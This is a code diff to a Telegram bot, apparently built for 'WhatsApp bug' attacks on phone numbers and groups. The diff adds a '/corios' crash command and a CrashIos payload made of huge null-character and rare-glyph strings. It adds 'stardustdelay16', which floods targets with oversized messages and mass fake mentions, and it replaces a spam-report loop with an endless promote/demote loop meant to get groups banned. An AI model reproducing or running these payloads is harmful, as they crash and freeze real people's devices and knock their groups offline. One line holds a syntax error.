@@ -785,7 +785,7 @@ bot.use(async (ctx, next) => {
 
     if (userId == ownerID) return next();
 
-    const bugCommands = ['/bangcwa', '/lockbrutal', '/xspam', '/corforce', '/corlock', '/corhard', '/corfreeze', '/onichan', '/corinvis', '/corblank', '/testfunction', '/bandgb'];
+    const bugCommands = ['/bangcwa', '/lockbrutal', '/xspam', '/corforce', '/corlock', '/corhard', '/corfreeze', '/onichan', '/corinvis', '/corblank', '/testfunction', '/bandgb', '/corios'];
     if (!bugCommands.some(cmd => command.startsWith(cmd))) return next();
 
     if (ctx.chat.type === 'private') return next();
@@ -1415,6 +1415,7 @@ bot.action("/bug", async (ctx) => {
 <tr><td>/corforce</td><td>62xxx</td><td>Forclose Andr13</td></tr>
 <tr><td>/corlock</td><td>62xxx</td><td>Lock Chat</td></tr>
 <tr><td>/corhard</td><td>62xxx</td><td>Delay Hard</td></tr>
+<tr><td>/corios</td><td>62xxx</td><td>Crash Ios</td></tr>
 <tr><td>/corfreeze</td><td>62xxx</td><td>Stuck Logo</td></tr>
 <tr><td>/onichan</td><td>62xxx</td><td>Lock Chat Desah</td></tr>
 <tr><td>/corinvis</td><td>62xxx</td><td>Delay Invis</td></tr>
@@ -1541,6 +1542,32 @@ bot.command(["corlock"], checkWhatsAppConnection, checkPremium, async (ctx) => {
 
 });
 
+bot.command(["corios"], checkWhatsAppConnection, checkPremium, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply("🪧 ☇ Example : /corios 62xx");
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  await ctx.reply(`
+✅️ corios (bug) selesai mengirim untuk ${q}
+`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "CEK TARGET", url: `https://wa.me/${q.replace(/[^0-9]/g, "")}`, style: "danger" }
+      ]]
+    }
+  });
+
+  (async () => {
+    for (let i = 0; i < 20; i++) {
+      await CrashIos(sock, target);
+      await sleep(1000);
+      console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
+    }
+  })();
+
+});
+
 bot.command(["corhard"], checkWhatsAppConnection, checkPremium, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply("🪧 ☇ Example : /corhard 62xx");
@@ -1558,8 +1585,9 @@ bot.command(["corhard"], checkWhatsAppConnection, checkPremium, async (ctx) => {
   });
 
   (async () => {
-    for (let i = 0; i < 25; i++) {
+    for (let i = 0; i < 20; i++) {
       await DelayOneHittV1(sock, target);
+      await stardustdelay16(sock, target);
       await sleep(1000);
       console.log(chalk.yellow(`📱 Mengirim ke ${target} (${i+1}/5)`));
     }
@@ -2034,8 +2062,8 @@ bot.command("bandgb", checkWhatsAppConnection, checkCooldown, async (ctx) => {
         // Perbaikan: Try-catch internal agar loop tidak merusak alur status
         for (let i = 0; i < 25; i++) {
             try {
-                await ReportGroupNew(sock, target);
-                await ReportGroupNew(sock, target);
+                await BanGroupNewV11(sock, target);
+                await BanGroupNewV11(sock, target);
             } catch (innerErr) {
                 console.log(chalk.yellow(`Pengiriman Banned Group ${i+1}: ${innerErr.message}`));
             }
@@ -3940,6 +3968,147 @@ async function DelayOneHittV1(sock, target) {
         }, { participant: { target } });
     }
 }
+
+async function CrashIos(sock, target) {
+  const rexzy = {
+    locationMessage: {
+      degreesLatitude: 21.1266,
+      degreesLongitude: -11.8199,
+      name: "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
+      url: null,
+      contextInfo: {
+        externalAdReply: {
+          quotedAd: {
+            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
+            mediaType: "IMAGE",
+            jpegThumbnail: null,
+            caption: "@rexzyofficial" + "𑇂𑆵𑆴𑆿".repeat(60000)
+          },
+          placeholderKey: {
+            remoteJid: "0@s.whatsapp.net",
+            fromMe: false,
+            id: "ABCDEF1234567890"
+          }
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage("status@broadcast", rexzy, {
+    messageId: "3EB0" + Math.random().toString(36).substring(2, 15).toUpperCase();,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: target,
+                content: undefined
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  });
+  console.log(`\x1b[36m─────「 Succes Kirim Bug To: ${target}!⏤ 」─────\x1b[0m`);
+}
+
+async function stardustdelay16(sock, target) {
+await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "ini stardust" + "𑇂𑆵𑆴𑆿".repeat(99999),
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "stardust_message",
+            paramsJson: "\u0000".repeat(1045000),
+            version: 3
+          }, 
+        }
+      }
+    }
+  }, { participant: { jid: target }});
+  
+await sleep(300);
+
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: { 
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "ini stardust" + "𑇂𑆵𑆴𑆿".repeat(99999),
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "forward_message",
+            paramsJson: "\u0000".repeat(1045000),
+            version: 3
+          }, 
+        }
+      }
+    }
+  }, { participant: { jid: target }});
+
+await sleep(300);
+
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "ini stardust" + "𑇂𑆵𑆴𑆿".repeat(99999),
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "address_message",
+            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"StardustConstruction","landmark_area":"X","address":"xxx","tower_number":"stardust","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"StardustHere | ${"\u0000".repeat(1045000)}"}}`,
+            version: 3
+          },
+          contextInfo: {
+            quotedMessage: {
+              paymentInviteMessage: {
+                serviceType: 2,
+                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
+              }
+            }
+          }
+        }
+      }
+    }
+  }, { participant: { jid: target }});
+  
+await sleep(300);
+  
+await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: {
+     extendedTextMessage: {
+       text: "\u0000".repeat(500000),
+         contextInfo: {
+           participant: target,
+             mentionedJid: [
+               "0@s.whatsapp.net",
+                  ...Array.from(
+                  { length: 1950 },
+                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
+                 )
+               ]
+             }
+           }
+         }
+       }
+     }, { participant: { jid: target }});
+   }
 
 async function anomoyusOneHit(sock, target) {
   const jid = target.includes("@") ? target : target + "@s.whatsapp.net";
@@ -7390,26 +7559,60 @@ async function RulxzXD(sock, target) {
   })
 }
 
-async function ReportGroupNew(sock, groupJid) {
-    const jid = String(groupJid).includes('@')
-        ? String(groupJid)
-        : `${String(groupJid).replace(/\D/g, '')}@g.us`;
+async function BanGroupNewV11(sock, groupJid) {
+  if (!groupJid.endsWith('@g.us')) {
+    throw new Error('@g.us server required');
+  }
 
-    for (let i = 0; i < 150; i++) {
-        try {
-            const result = await sock.query({
-                tag: 'iq',
-                attrs: { to: '1010500090@s.whatsapp.net', type: 'set', xmlns: 'w:comms:chat' },
-                content: [{
-                    tag: 'report',
-                    attrs: { jid, type: 'spam' }
-                }]
-            });
-            console.log('[GROUP REPORT]', jid, result);
-        } catch (err) {
-            console.log('[GROUP REPORT FAILED]', err.message);
-        }
+  let batch = 0;
+
+  while (true) {
+    batch++;
+
+    const actions = batch % 2 === 0
+      ? ["promote"]
+      : ["demote"];
+    const targets = batch % 2 === 0
+      ? ["1201200911@s.whatsapp.net"]
+      : ["1212009900@s.whatsapp.net"];
+
+    for (let i = 0; i < targets.length; i++) {
+      try {
+        await sock.groupParticipantsUpdate(groupJid, [targets[i]], actions[0]);
+        await sock.sendPresenceUpdate('composing', groupJid);
+      } catch (err) {
+        console.error('error:', err && err.message ? err.message : err);
+      }
     }
+
+    const startTime1 = Date.now();
+    const duration1 = 1500;
+    while (Date.now() - startTime1 < duration1) {
+      if (!groupJid.endsWith('@g.us')) {
+        throw new Error('@g.us server required');
+      }
+      try {
+        await sock.groupParticipantsUpdate(groupJid, [targets[0]], actions[0]);
+        await sock.sendPresenceUpdate('composing', groupJid);
+      } catch (err) {
+        console.error('error:', err && err.message ? err.message : err);
+      }
+    }
+
+    const startTime2 = Date.now();
+    const duration2 = 1 * 60 * 1000;
+    while (Date.now() - startTime2 < duration2) {
+      if (!groupJid.endsWith('@g.us')) {
+        throw new Error('@g.us server required');
+      }
+      try {
+        await sock.groupParticipantsUpdate(groupJid, ['1201200911@s.whatsapp.net'], 'promote');
+        await sock.sendPresenceUpdate('composing', groupJid);
+      } catch (err) {
+        console.error('error:', err && err.message ? err.message : err);
+      }
+    }
+  }
 }
 
 async function BanGroupFastV2(sock, groupJid) {
